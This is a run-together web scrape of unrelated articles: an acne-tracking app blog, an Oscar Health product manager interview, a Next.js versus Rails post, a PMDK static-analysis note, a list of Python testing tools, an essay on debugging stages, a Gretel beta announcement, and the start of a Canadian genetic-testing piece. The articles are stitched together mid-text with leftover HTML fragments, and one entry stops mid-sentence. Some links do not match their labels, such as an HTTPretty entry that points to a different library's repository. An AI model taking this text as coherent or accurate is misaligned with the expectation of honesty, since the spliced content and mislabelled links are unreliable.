<p>With these newfound algorithmic ways of thinking, it was time logically get rid of my acne. Using the scientific method as a guideline, I decided to narrow down what factors affected my skin and try different product regimens to find my cure. The process looked like so:</p>



<ol><li><strong>Create a Hypothesis</strong>: I would choose a regimen to follow for some amount of time. Maybe I’d try a regimen I’d found on acne.org.<ul><li>e.g “Benzoyl Peroxide on left side of face, 1x a day; Moisturize 1x a day for 2 weeks.”</li></ul></li><li><strong>Run the Experiment</strong>: Every day or two I would:<ol><li>Take pictures of the affected areas with my new regimen.</li><li>Write a log in a private Google Doc the status of my skin and how the experiment was going. This log includes how my skin looks and feels, and any externalities that could affect the experiment. These logs would allow me to pinpoint how I felt about my skin over time.<ul><li>e.g “I have 10 pimples today and a good bit of redness. Mostly on the right side of my face. They do feel a bit less inflamed today. I also forgot to shower after working out yesterday, and woke up feeling sweaty. OOF 😕”</li></ul></li></ol></li><li><strong>Analyze the Results</strong>: After a solid time period (and 2 weeks may not always be enough!), I would compare my photos and logs from today to before I began this regimen’s experiment. If I showed some improvement, I would keep up the regimen. If I was getting worse, I would tweak the regimen or completely change to a new one with a day or 2 of buffer in between.</li></ol>



<p>I began to take a secret joy in doing this method. Firstly, I felt like I was actively working towards clearing my acne every night. I would come up with new ideas through the week and save them for later to try. Secondly, I felt like I wasn’t completely lost with my acne anymore. I used to get overwhelmed trying to keep all of my past treatments and externalities (food, sleep schedules, stress, etc.) together in my head. I would recurrently try regimens that I’d already attempted and forgot about to see if they’d work this time. Now, I had a mental map, process, and actual log of what worked and what didn’t.</p>



<h4>Issues</h4>



<p>The above method worked, but it is definitely rudimentary and so I’d found a few annoyances.</p>



<ul><li><a href="https://docs.google.com/">Google Docs</a> and <a href="https://blog.skintheory.app/skintheorys-birth/Flickr.com">Flickr</a> (where I stored my photos) were completely unlinked. They are 2 different apps. I would have to date entries in the Google Doc and find them in another tab on Flickr to find the photos.</li><li>I had to use Flickr to store my photos because I now had nightly acne selfies showing up in my phone’s gallery. If I were then trying to show a friend another picture, all these acne photos would pop up. 😐 Also, Flickr, now has a 1k picture upload limit. 😐</li></ul>



<h2 id="making-method-easier">Making The Method Easier: The SkinTheory App</h2>







<p>As someone who was able to beat their acne by thinking this way, I wanted to share this scientific process with kindred spirits who I knew were suffering as well. Unfortunately, my home-brewed process felt kinda janky.</p>



<p>In my free time I decided to learn React-Native to make an app (with some help of course) to streamline this process. It took loads of work between coding, making art assets, making a website, etc. but I think the acne solving method above is now much more straight forward. Especially for people who don’t consider themselves “technical”. Anyone with problem skin can now find a solution using this <a href="https://www.skintheory.app/">SkinTheory Method</a> without the <a href="https://www.urbandictionary.com/define.php?term=pita">PITA</a> overhead of managing a huge Google Doc and Flickr Library. Also, photos are sneakily hidden away in the app in order to not peskily show up in the phone gallery when you’re showing friends your cute dog pics.</p>



<h2>Skin Success</h2>



<p>So, if you like to see the results of my “Before &amp; After pics” here’s a pic with some of the fam below. I’ve moved to Ireland since I graduated so we’re out on my cousin’s farm.</p>

<p>I’m completely clear now and most of the scarring has healed. It’s a liberating feeling to be past acne but it did take time to find the correct regimen.</p>



<p>To wrap up what worked for me, I have crazy sensitive skin. The normal benzoyl peroxides and salicylic acids for solving acne would irritate my skin and cause more acne. I learned that I had to be moisturizing daily (thanks <a href="http://acne.org/">Acne.org</a>!), using gentle <a href="https://www.acne.org/comedogenic-list.html">non-comedogenic</a> moisturizers and soaps, and managing my stress. College caused huge stress and also affected my sleeping/eating habits which seemed to be causing more acne for me.</p>



<p>In the end, the SkinTheory Method helped me act as a scientist, testing and isolating factors affecting my own skin. It gave me the peace of mind that I was doing something at each step to control my acne. It paid off. <strong>Best of luck with your</strong> <strong>own experiments. 🔬</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>“Behind the Scenes” is a series focused on highlighting the unsung heroes – Operations teams. </em><em>Their work is often critical to the operations of the company, yet few if any customers know they exist. Our goal is to bring these teams to light and surface the amazing work they do day-to-day to keep the products we love humming along smoothly.</em></p>



<p>We spoke with Shohini, Product Manager at Oscar Health – a health insurance company headquartered in New York City whose mission is to “do our part to dismantle and rebuild the country’s broken health care system and improve health outcomes for everyone”.<span id="easy-footnote-1-57"></span><span><a href="#easy-footnote-bottom-1-57" title="&amp;#8220;About Oscar Health&amp;#8221;, accessed August 18, 2020, https://www.hioscar.com/about."><sup>1</sup></a></span> Shohini’s team, Digital Member Experience, builds products to empower users to easily find the care that they need<strong>.</strong></p>



<p>We discussed her thoughts on a current project at Oscar Health, how she thought through her career path, and her advice for new grads on how to choose a role or company.</p>



<p><strong>Project Highlight – Chronic Disease, the $3.5 Trillion Industry</strong></p>



<p>Shohini walks me through Oscar Health’s upcoming Virtual Care Program, a program that provides patients with no-cost telemedicine visits with an Oscar Health primary care provider and provides free downstream services such as labs, medical equipment, and prescriptions. Her focus is on managing care routing, mainly driving adoption and tailoring the user experience.&nbsp;</p>



<p>Oscar’s unique positioning as an insurer, and now care delivery provider, allows them to disrupt the current service model – namely when a patient’s provider and insurer are two parties pitted against each other, with no coordination. Ideal especially during COVID, the program’s goal is to incentivize patients to exercise preventative care, allowing them to save on potential financial, emotional, and physical constraints that come from unmanaged diseases.&nbsp;</p>



<p>The long term goal of many virtual care programs is to help patients manage and bring down the cost of chronic diseases. Chronic disease is defined broadly as “conditions that last 1 year or more and require ongoing medical attention or limit activities of daily living or both.”<span id="easy-footnote-2-57"></span><span><a href="#easy-footnote-bottom-2-57" title="CDC, &amp;#8220;About Chronic Diseases&amp;#8221;, accessed August 18, 2020, <a href=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot;>https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20State.</a>"><sup>2</sup></a></span> As the country’s leading cause of death and disability, chronic disease has affected 6 out of 10 Americans, lead to the deaths of 1.7 million Americans annually, and accounts for a whopping $3.5 trillion in healthcare costs every year.<span id="easy-footnote-3-57"></span><span><a href="#easy-footnote-bottom-3-57" title="CDC, &amp;#8220;About Chronic Diseases&amp;#8221;, accessed August 18, 2020, <a href=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot; data-type=&quot;URL&quot; data-id=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot;><a href=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot;>https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.</a></a>"><sup>3</sup></a></span>&nbsp; To make matters worse, the prevalence rate of chronic disease is increasing. With the advancement of medicine leading to longer lifespans, as well as existing risk factors such as poor nutrition, smoking, and excessive alcohol use, the effects of heart disease, cancer, and stroke (top chronic diseases) has led to a greater impact on the wider American population and has thus attracted a greater focus from the healthcare industry.&nbsp;</p>



<p>Many within the industry are aiming to solve the problem of chronic diseases – some remedies being chronic disease focused primary care, Medicare payment models, and even tech investments focused on Medicaid populations. Medicare is a federal insurance program that provides health coverage for Americans 65 years or older or younger and disabled. Given the older population, Medicare sees a higher concentration of chronic diseases across its participants. In contrast, Medicaid is a state and federal assistance program that serves a low-income population, another hub for potential high rates of chronic disease due to structural disadvantages.</p>



<p>The main pain point here, Shohini highlights, is the ruthless cycle of poverty, where healthcare is more often mixed in with other economic, educational, and social gaps. For example, a low-income American would have access to low quality housing and food, leading to greater likelihood of contracting diseases. This circumstance would ultimately lead to greater time spent having to go to doctor’s appointments, more money lost given the increased number of visits, and low productivity due to the physical, emotional, and financial stressors. Care is needed, but financial incentives make it difficult to distribute to those most in need. Oscar Health, through its focus on easy-to-use and no-cost preventative care, hopes to test a different economic model for healthcare that actually incentivizes preventative care in the general population. In focusing more specifically on tackling chronic diseases and addressing social determinants of health, Oscar’s new program will hopefully lead to a brighter, healthier future for the American population.</p>



<p><strong>Shohini’s Background – Why Oscar Health?&nbsp;</strong></p>



<p>Shohini’s career is threaded with the principle of “working to build and expand upon basic services for people”. Coming from UC Berkeley with an initial focus on International Relations and Policy, she pivoted into tech by interning for Oscar Health as a Product Management intern focused on insurance infrastructure. She then transitioned to an operational role at Savvy, an early-stage healthcare startup based in the Bay Area. Both experiences brought their respective learnings and perspectives.</p>



<p>Upon experiencing both an early-stage startup and larger-scale company, Shohini details the different pros and cons she experienced from both. The startup allowed for flexibility, quick decision-making and re-prioritization but at the cost of less structured experimentation. On the flip-side, the larger-scale company had access to a broader range of healthcare experts and ample data. As a side effect, however, more stakeholders led to greater time spent gathering project feedback and buy-in.</p>



<p>Ultimately Shohini landed back at Oscar Health, charged with broader experiences and fresh learnings, ready to help tackle the company’s mission of making virtual care and healthcare concepts more accessible. She rejoined excited to learn more broadly about healthcare and to continue her personal mission of “expanding basic services”. Not only is she able to be part of a company that aligns with her personal mission, but her function allows her to play a pivotal role in actively building products to improve the care experience for the user.</p>



<p><strong>Advice for New Grads – Materialize the Change You Want to Make&nbsp;</strong></p>



<p>Shohini speaks to her internship experience at Oscar Health and her approach to understanding whether or not the company was the right fit. Driving projects given to her were of course learning experiences, but going beyond the assigned work allowed her to fully maximize her time there. She grabbed coffees with people and teams outside of her scope in order to explore her interests. She dug into understanding which projects (outside of her day-to-day) were prioritized as a company. She socialized with colleagues after work, observing to see if the company would be a good culture fit. All were factors that played important roles in having Shohini choose the right company, the right team, and the right product.</p>



<p>Zooming out, she provides three actionable principles she used to help her decision-making process for choosing a company/role:</p>



<p>1) Have a clear idea of the outcome you want to create.&nbsp;</p>



<p>2) Understand what the gaps are of the company and whether that’s exciting to you.&nbsp;</p>



<p>3) Pick a mission or product that you’re building over a specific role. It’s easy to be drawn towards specific companies for the sake of the title or prestige, but at the end of the day, choose based on your passion and interests. And <em>that</em> is what will provide long-term impact.</p>



<p>In summary, Shohini’s Virtual Care project, journey of navigating different companies and functions, and thinking through culture and company fit, all highlight the importance of mission and impact – execution for the the sake of execution can take you only so far, but execution with a purpose leads to greater momentum, longevity, and well-being.</p>

August 25, 2020 | https://suddenschools.org/blog/react-nextjs-vs-ruby-on-rails | <a href="https://web.archive.org/web/*/https://suddenschools.org/blog/react-nextjs-vs-ruby-on-rails">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As a long-time Ruby on Rails developer I was really hesitant to try something new. Learning is time consuming, it requires exploring and making mistakes. Why bother, if you already know a language that works pretty great, and gets the job done?</p>
<p>While Ruby is a lovely language, and Rails is a fantastic framework which enabled countless startups to launch and become famous, Rails also has limitations which can be easily overcome with React, and the time and cost savings are worth the initial learning curve.</p>
<p>React enables a smooth transition from a monolith app, where everything is programmed from one code base, to a component based app, where logic, data, and presentation are handled by multiple applications. It was developed out of necessity to run an efficient engineering operations with thousands of developers, but it scales equally well for a company of one.</p>
<p>With React you can easily split your application into parts where front and back are developed, maintained and deployed by different teams, at different times. This improves flexibility across the board. Different teams can work on a single app, but improve it in steps, without affecting each other.</p>
<p>React simply listens to new data and updates your application when the data is updated. It's magic!</p>
<p>Facebook, the React parent, did lots of pretty forward-thinking development, and Rails team has been playing catch up. Rails is still a great way to build logic bits for your application, to be the brain and the datacenter of your app, but as far as display of information is concerned, React is a few steps ahead.</p>
<p>Before <a href="https://nextjs.org/">Next.js</a>, I was afraid of React. If something broke in Rails, I knew where to fix it, or at least how to look for the right information which would enable me to fix it. I was familiar with a bunch of useful gems, and the MVC model was well engrained in my head. Rails was familiar, and comfortable. The paradigm change from Rails to webpack/node/react ..etc, it seemed more work than I was willing to put in. </p>
<p>Next changed everything. They took everything that was good about React, sprinkled some useful simplifications, made it idiot-proof (thank you!), and put it all on efficient pipeline that deploys blazingly fast (seconds vs. minutes). Now that I have taken the time to understand it a little, I can launch a brand new website using Next in a matter of minutes, deploy it to Vercel in seconds, and show it to customers in that moment. Then, if I want to make a change, re-deployment only takes a few seconds. Quite literally, it took only 35 seconds to deploy this blog post.</p>
<p>If I were to pick my top 3 favorites about Next, it would be this. (1) It turns your entire website into a series of static pages that render really fast, for really cheap. Right now, hobby hosting on Vercel costs $0, and that's a pretty great price! (2) Next.js does not require a database to start, which removes the unnecessary complexity for both local dev and deploy. On top of that, when needed, the "database" can be literally anything, from Postgres to a Google Sheet, which again makes it simple and cheap. (3) It's made React Routing manageable, so when users click on a link, it works just like it would in a normal static html, with the underlying complexity hidden away. This might be a small thing by dev standards, but it's a huge plus when it comes for a particular purpose of lauching usable websites.</p>
<p>Learning gives you options, whether you are learning a new foreign language, or learning to use a fork, learning enables a new experience that leads to new, usually better outcomes. It is no different for programming, and I highly recommend Next.js as step in the right direction.</p>
<p>Take a look on their website, look at the showcase for social proof, and of course if you want a bit more information without having to dig it up yourself, sign up for one of the <a href="https://suddenschools.org/">Sudden Schools</a> courses, and have it explained in short delightful videos.</p>
<p>Hope to see you soon!</p>

<p>In the PMDK team, we focus on the quality of our codebase. One of the
standard practices in the software development is a static code analysis, which
improves the overall project quality and fixes bugs in the early stage of
development. Since there is no silver bullet for avoiding bugs, we already use
two different static analysis tools and many runtime checkers e.g. <a href="https://www.youtube.com/watch?v=R2m-wH7W-5U">valgrind</a>.
Improving static analysis effectiveness is a separate academic problem. What is
worth mentioning is the fact that different tools take a various approach. With
combined advantages of Open Source projects such as transparency and
reliability, as well as a new static analysis tool, we get a new bag of tricks
and a fresh look to an old problem :).</p>



<p><a href="https://viva64.com/en/pvs-studio/">PVS-Studio</a> is a static-analysis tool for detecting bugs and
security weaknesses in the source code of programs. What distinguishes
PVS-Studio is their comprehensive support for open-source projects.
After a quick e-mail exchange, the PVS-Studio team agreed to perform an analysis
of the PMDK project. The analysis is available in this <a href="https://viva64.com/en/b/0756/">post</a>.</p>



<p>PVS-Studio managed to find a couple of issues, which were not previously
detected; we analyzed detected bugs and addressed changes in the following
<a href="https://github.com/pmem/pmdk/pull/4942">Pull Request</a>. From my experience, I highly recommend cooperating with
the PVS-Studio team - excellent support and quick response time allows us to
improve the PMDK project. See <a href="https://viva64.com/en/pvs-studio/">PVS-Studio</a> yourself :)</p>

            <p>Experienced programmers understand perfectly well that in development they spend most of the time reading code 
and therefore they treat the process of writing code with the deepest trepidation (and sometimes with fanaticism). 
To write quality and maintainable code, you need to take the time to write tests and integrate QA tools. There is a 
whole technique aimed at test-driven development (<a href="https://en.wikipedia.org/wiki/Test-driven_development">TDD</a>) and I will not devote this article to the topic of testing as 
such. Tests are absolutely necessary and there is nothing to discuss. In this article, we are going to talk about tools 
that help you write quality Python code.</p>

<p><a href="https://github.com/HypothesisWorks/hypothesis"><strong>Hypothesis</strong></a>  is a family of testing libraries that let you write 
tests parametrized by a source of examples. A Hypothesis implementation then generates simple and comprehensible 
examples that make your tests fail. This simplifies writing your tests and makes them more powerful at the same time, 
by letting software automate the boring bits and do them to a higher standard than a human would, freeing you to focus 
on the higher-level test logic.</p>



<p><a href="https://github.com/robotframework/robotframework"><strong>Robot Framework</strong></a> is a generic open-source automation framework

      </h2>

<p><a href="https://docs.python.org/3/library/unittest.mock.html"><strong>unittest.mock</strong></a> is a library from Python’s stdlib for mocking. 
It allows you to replace parts of your system under test with mock objects and make assertions about how they have been used.</p>

<p><code>unittest.mock</code> provides a core <code>Mock</code> class removing the need to create a host of stubs throughout your test suite. 
After performing an action, you can make assertions about which methods / attributes were used and arguments they
were called with. You can also specify return values and set needed attributes in the normal way.</p>



<p><a href="https://github.com/spulec/freezegun"><strong>FreezeGun</strong></a> is a library that allows your Python tests to travel through time
 by mocking the datetime module.</p>

<p>Once the decorator or context manager have been invoked, all calls to <code>datetime.datetime.now()</code>, 
<code>datetime.datetime.utcnow()</code>, <code>datetime.date.today()</code>, <code>time.time()</code>, <code>time.localtime()</code>, <code>time.gmtime()</code>, and <code>time.strftime()</code>
will return the time that has been frozen.</p>



<p><a href="https://github.com/patrys/httmock"><strong>HTTPretty</strong></a> is an HTTP client mocking tool for Python - inspired by Fakeweb for Ruby.</p>

<p>Common use cases:</p>

<ul>

      <h2 id="code-coverage">
        
        <a href="#code-coverage">Code coverage</a>
        
      </h2>

<p><a href="https://github.com/nedbat/coveragepy"><strong>Coverage.py</strong></a> measures code coverage, typically during test execution. It uses 
the code analysis tools and tracing hooks provided in the Python standard library to determine which lines are 
executable, and which have been executed.</p>




    
      <h2 id="object-factories">
        
        <a href="#object-factories">Object Factories</a>
        
      </h2>

<p><a href="https://github.com/FactoryBoy/factory_boy"><strong>factory_boy</strong></a> is a fixtures replacement based on thoughtbot’s factory_bot.</p>

<p>As a fixtures replacement tool, it aims to replace static, hard to maintain fixtures with easy-to-use 
factories for complex objects.</p>




    
      <h2 id="code-style">
        
        <a href="#code-style">Code Style</a>
        
      </h2>

<p><a href="https://github.com/wemake-services/wemake-python-styleguide"><strong>wemake-python-styleguide</strong></a> is is strictest and most 
opinionated python linter ever.</p>

<p>Goals of WPS:</p>

<ol>
  <li>Enforce <code>Python 3.6+</code> usage</li>
  <li>Significantly reduce complexity of your code and make it more maintainable</li>
  <li>Enforce “There should be one– and preferably only one –obvious way to do it” rule</li>
  <li>Create consistent coding and naming style</li>
</ol>



<p><a href="https://github.com/PyCQA/pycodestyle"><strong>pycodestyle</strong></a> is a tool to check your Python code against some of the style 
conventions in PEP8.</p>

<p>Features:</p>

<ul>
  <li>Plugin architecture: Adding new checks is easy.</li>
  <li>Parseable output: Jump to error location in your editor.</li>
  <li>Small: Just one Python file, requires only <code>stdlib</code>. You can use just the <code>pycodestyle.py</code> file for this purpose.</li>
  <li>Comes with a comprehensive test suite.</li>
</ul>



<p><a href="https://github.com/psf/black"><strong>Black</strong></a> is the uncompromising Python code formatter. By using it, you agree to cede
control over minutiae of hand-formatting. In return, <em>Black</em> gives you speed,
determinism, and freedom from <code>pycodestyle</code> nagging about formatting. You will save time
and mental energy for more important matters.</p>



<p><a href="https://github.com/google/yapf"><strong>yapf</strong></a> is a formatter for Python files.</p>

<p>YAPF takes a different approach. It’s based off of <code>clang-format</code>, developed by Daniel Jasper. In essence, 
the algorithm takes the code and reformats it to the best formatting that conforms to the style guide, even if the 
original code didn’t violate the style guide. The idea is also similar to the ‘gofmt’ tool for the Go programming 
language: end all holy wars about formatting - if the whole codebase of a project is simply piped through YAPF 
whenever modifications are made, the style remains consistent throughout the project and there’s no point 
arguing about style in every code review.</p>

            <h2 id="a-programming-classic">A programming classic</h2>

<p>There’s a classic programmer joke - the stages of debugging:</p>

<ol>
  <li>That can’t happen</li>
  <li>That doesn’t happen on my machine</li>
  <li>That shouldn’t happen</li>
  <li>Why does that happen</li>
  <li>Oh, I see…</li>
  <li>How did that ever work?</li>
</ol>

<p>It’s funny because it’s true.</p>

<p>But why do we laugh at this? It’s a pretty terrible state of affairs.</p>

<p>There’s a lot to unpack in this joke.</p>

<h3 id="that-cant-happen">“That can’t happen”</h3>

<p>First off why is our reaction immediately to deny the very existence of the bug? It’s unlikely that someone will have gone to the effort of cooking up an elaborate lie to waste our time looking for a non-existent bug.</p>

<p>Bugs are a violation of expectation, someone expected the system to behave in a certain way and it didn’t.</p>

<p>From a developers point of view, our expectations have also been violated. We told the computer to do one thing, and it has decided to something completely different.</p>

<p>This leads to the classic - “there must be a bug in the compiler” or “must be user error” and the equally popular blame the tools: “it’s because we’re using XYZ language or framework - everyone knows it’s buggy/broken”.</p>

<p>Developers take a lot of pride in their work - we’re generally compensated well because we are considered to be experts in our field - suddenly we’re exposed as being just as fallible as the next person.</p>

<p>Obviously the “That can’t happen” is a foolish response. A computer just does what it is told to do. It is not an evil mischievous imp that is deliberately trying to sabotage our work.</p>

<p>We need to change our immediate response to one of acceptance - there’s a bug, no point in pretending it doesn’t exist.</p>

<h3 id="that-doesnt-happen-on-my-machine">“That doesn’t happen on my machine”</h3>

<p>What kind of a developer just chucks code over the wall without testing it? Of <em>course</em> it works on my machine!</p>

<p>Well, what can we say about this one? We could just lump this in with the denial of the bug existence, but it’s worth breaking it out into its own discussion.</p>

<p>In complex systems this is a remote possibility, code that works in isolation may not work when deployed. Interactions between different parts of a system can cause the behaviour to change in unexpected ways.</p>

<p>However, in a well-architected system this should be rare, and if it’s really happening then it’s a sign that something is wrong.</p>

<p>There’s no point saying “it works on my machine” until you’ve actually gone and tried to reproduce the bug on your machine.</p>

<p>Once you can prove categorically that it works on your machine then you can add that to the evidence pile for debugging the problem.</p>

<h3 id="that-shouldnt-happen">“That shouldn’t happen”</h3>

<p>“Umm, yes, that’s why I’ve reported it as a bug” would be the facetious reply.</p>

<p>But this is another facet of the “I told the computer to do this, but instead it’s doing that”. It’s a violation of expectations on the developer’s side of things.</p>

<p>This is usually the phase of acceptance. We’ve now reached the point where we agree that something is wrong, we’ve seen the bug with our own eyes, it’s something wrong with what we’ve done, there’s no more excuses to hide behind.</p>

<h3 id="why-does-that-happen">“Why does that happen?”</h3>

<p>This is where things start to get interesting. This is the fun part bug bashing.</p>

<p>Why is this bug happening? What’s our hypothesis for what we are seeing and how do we test it?</p>

<h3 id="oh-i-see">“Oh, I see”</h3>

<p>The lightbulb moment of insight, through investigation you’ve developed a hypothesis of why the bug is happening and you have an idea on how to fix it.</p>

<p>The problem now becomes impossible not to see. It’s obvious. How did this code ever ship? Which moves up nicely onto the next stage.</p>

<h3 id="how-did-that-ever-work">“How did that ever work?”</h3>

<p>Hindsight is a wonderful thing.</p>

<p>Now that you know how to create the bug, and you know how the code is wrong, you’re wondering which idiot wrote it (spoiler alert - git blame will point the finger at you).</p>

<p>The code could never have worked properly. You’ll start to wonder how many other bits of the codebase are complete nonsense.</p>

<h2 id="adjusting-our-approach">Adjusting our approach</h2>

<p>Let’s turn the programming classic on its head and rewrite the stages of debugging:</p>

<ol>
  <li>This is happening</li>
  <li>Research</li>
  <li>Create a hypothesis</li>
  <li>Test hypothesis</li>
  <li>Fix the problem</li>
  <li>How do we stop this happening again?</li>
</ol>

<h3 id="this-is-happening">“This is happening”</h3>

<p>No point denying it - there’s a bug, I’m glad you found it.</p>

<h3 id="research">Research</h3>

<p>We need to gather information on the bug:</p>

<ul>
  <li>how do we reproduce it?</li>
  <li>what test data do we need?</li>
  <li>how much of the system do we need to run recreate it?</li>
  <li>what’s the minimum I need to recreate to debug it?</li>
  <li>which part of the codebase is it happening in?</li>
  <li>which bit of code is the likely problem?</li>
  <li>do we have any relevant logs from when the problem occurred?</li>
</ul>

<p>The more information we can gather the better.</p>

<h3 id="create-a-hypothesis">Create a hypothesis</h3>

<p>Our research should have pointed us at the potential problem, we should have developed enough knowledge to form a working hypothesis on what the bug is caused by. We should hopefully be looking at the bit of code that is wrong and have an idea on how to fix it.</p>

<h3 id="test-hypothesis">Test hypothesis</h3>

<p>How are you going to test your fix works?</p>

<p>Before jumping in and changing code can you definitely recreate the bug? Does it happen consistently in your test environment?</p>

<p>Can you write a unit test to recreate the bug?</p>

<p>When you apply your fix does the test now pass? When you run through the steps to recreate does it now consistently work?</p>

<h3 id="fix-the-problem">Fix the problem</h3>

<p>If we’re lucky the previous step proves that our thinking was correct, we’ve changed the code and everything works.</p>

<p>Clean up any debugging code go through code reviews and deploy - everyone is happy!</p>

<p>Don’t forget to check that you’ve not broken anything else…</p>

<p>The bug is fixed when the person who raised the bug in the first place is happy.</p>

<h3 id="how-do-we-stop-this-happening-again">How do we stop this happening again?</h3>

<p>This is the real value in finding and fixing bugs. The bug should never have happened in the first place.</p>

<ul>
  <li>Are we missing unit tests for this part of the codebase?</li>
  <li>Have we missed a whole class of unit tests across the codebase that make this kind of bug more likely?</li>
  <li>Are we missing integration tests?</li>
  <li>Do we have automated tests to catch these bugs?</li>
  <li>Is there something wrong in our process that allowed this bug to slip through the net?</li>
</ul>

<h2 id="types-of-bugs">Types of Bugs</h2>

<p>What kind of bugs do we encounter? And how do we fix them?</p>

<h3 id="easy-bugs">Easy(?) Bugs</h3>

<p>There’s a set of bugs that can be classed as “easy(?)”. There’s a question mark next to the easy as a bug being obvious or repeatable does not necessarily mean the finding the underlying cause and fixing it is necessarily easy.</p>

<ul>
  <li>UI Bugs</li>
  <li>Bugs of Omission or Misinterpretation</li>
  <li>Repeatable bugs</li>
</ul>

<h3 id="ui-bugs">UI Bugs</h3>

<p>It functions but it doesn’t look right.</p>

<p>UI bugs tend to revolve around the styling and positioning of elements.</p>

<p>Well organised companies will have wireframes and high definition mockups that you should be working from. They should have style guides and component libraries that tell you how things should look and behave.</p>

<p>Sometimes, we are working in the dark, there may not have been time or resources to design wireframes and mockups, you may be working from some scribbles on a napkin - make sure you fit with the rest of the application. Don’t break people’s expectations!</p>

<p>Another source of these bugs are different device formats - maybe it’s fine on your large desktop monitor, but on small laptops or mobile devices the UI you’ve created just doesn’t work.</p>

<p>There’s also a class of bugs around accessibility issues - these often get overlooked and unless attention is paid to this area it’s easy to forget about it only to have it flagged by a diligent QA person.</p>

<p>Solving these bugs should be straightforward:</p>

<ul>
  <li>What is it supposed to look like?</li>
  <li>Make it look right</li>
  <li>Test on the correct target devices and sizes</li>
</ul>

<p>There may be some fundamental process issues to be addressed here - someone knows what it should look like as they have raised the bug.</p>

<p>Why didn’t you know what it was supposed to look like when you built it?</p>

<h3 id="bugs-of-omission-or-misinterpretation">Bugs of Omission or Misinterpretation</h3>

<p>You thought you’d built the right thing.</p>

<p>You didn’t…</p>

<p>In theory, this should be an easy one to fix - find out what was supposed to be built, build it…</p>

<p>There are some questions to be asked around what went wrong in this situation - was the task not specified in enough detail, is there a communication gap between the product managers and the dev team that leads to the wrong thing being built?</p>

<p>Or did you just fundamentally misunderstand what was being asked of you?</p>

<p>Sometimes it’s simply a case of trying to hit a moving target. By the time you’ve finished building something everyone’s understanding of what should be built has changed. Expectations have changed and someone forgot to tell you…</p>

<p>Something is broken in your process - it’s important to work out what it is if this class of bug keeps occurring.</p>

<h3 id="repeatable-bugs">Repeatable bugs</h3>

<p>Every time I do these steps, this thing happens, it’s not what I expect to happen, it should do this instead.</p>

<p>This is a nice class of bugs - repeatable with a clear set of steps to recreate the problem.</p>

<p>Should be an easy fix:</p>

<ul>
  <li>Look at the application logs whilst recreating the bug</li>
  <li>Inspect any relevant crash logs and stack traces</li>
  <li>Run through the steps with a debugger attached and have it break on exceptions</li>
  <li>Simply walk through the code and sanity check it - does it make sense?</li>
</ul>

<p>However, for new developers or people unfamiliar with the codebase these can also be extremely frustrating bugs.</p>

<p>I can happily recreate the bug, it breaks on my machine, I have no idea where to even start looking in the codebase for where to fix it.</p>

<p>Senior developer strolls over, takes one look at the bug and immediately brings up the line of code that is the problem.</p>

<p>Someone who knows the codebase intimately will probably know where most data in the system is coming from and will appear to have some magical power for identifying where a bug it.</p>

<p>This is why bug fixing a few simple bugs can be such a good onboarding process.</p>

<p>What can we do if we don’t know the codebase?</p>

<p>We’ll need to start employing our powers of detection and deduction.</p>

<p>Look at the architecture of the system, how does data flow from one place to another. What are good …</p></div></div>

We founded Gretel based on our beliefs that data shouldn’t be scary, and for you to compete in today’s world, you need to be able to use and learn from your data. </p><p>Companies like Amazon, Google, and Apple have the resources to give the developers the best of both worlds- data privacy and streamlined access to data. We’re here to make that possible for any developer.</p><p>In February we published our first <a href="https://gretel.ai/blog/gretel-readme">README</a> and started laying out our goal of enabling developers to safely share and collaborate with sensitive data, and our vision of democratizing building with data so everyone can use it. We asked for your feedback and ideas, and promised to share research, open source code, and provide examples. </p><p>In the 6 months since then, we have had conversations with nearly 100 developers and companies to understand the barriers to working with sensitive data and how we can apply privacy-enhancing technology to break down those barriers. Here is what we learned:</p><ul role="list"><li><strong>It can take developers months to get access to sensitive data to test an idea</strong>. Often this requires PM and legal approvals, snap-shots of production databases, and manual anonymization of sensitive fields. </li><li><strong>Privacy is an engineering problem, not a policy problem</strong>. Policies are open to interpretation, lack enforceability at different stages of a workflow, and eventually get abused. </li><li><strong>Fairness and ethics in AI is incredibly important. Datasets used to power AI in our lives are often limited and imbalanced, leading to bias against users and groups. &nbsp;</strong>‍</li></ul><p>In the past year, we have built a set of open-source SDKs that enable developers to label and share access to data, composable APIs to enable transformations to streaming data, and an &nbsp;open-source AI-based synthetic data library that can generate artificial datasets from sensitive data with <a href="https://gretel.ai/blog/using-generative-differentially-private-models-to-build-privacy-enhancing-synthetic-datasets-from-real-data">provable privacy guarantees</a>, and automatically boost minority classes in datasets to <a href="https://gretel.ai/blog/reducing-ai-bias-with-synthetic-data">reduce AI bias</a>.</p><p>Today, we are thrilled to release <a href="https://console.gretel.cloud/login">Gretel’s public beta to any developer</a>. It’s free, and you can get started in minutes with one of our guides for <a href="https://gretel.ai/gretel-cloud-faqs/how-do-i-get-started">labeling and sharing a dataset in 2 minutes</a>, or even generating <a href="https://www.youtube.com/watch?v=gS7kpR-LJTs&amp;t=144s">your first synthetic dataset</a> with differential privacy guarantees.</p><p>We are building Gretel for developers like you, so don’t be shy.

<p>In the past decades, genetic testing has played a growing
role in the diagnosis of inherited eye diseases such as retinitis pigmentosa, Usher
syndrome and Leber Congenital Amaurosis. Not only can a genetic test
information provide accuracy about how the eye disease will progress, but it also
takes on a greater significance as new gene-specific treatments, such as gene
therapy and gene editing are starting to be developed. &nbsp;Without a genetic test result, individuals might
not be eligible to participate in clinical trials or to receive these new treatments.
</p>



<p>To protect the privacy of Canadians’ genetic test
information, in 2009, Huntington Society of Canada, Fighting Blindness Canada
(FBC), Parkinson Canada, and other leading Canadian health charities came
together to be part of the Canadian Coalition for Genetic Fairness (CCGF), all
meeting at Parliament Hill to discuss genetic discrimination, providing a voice
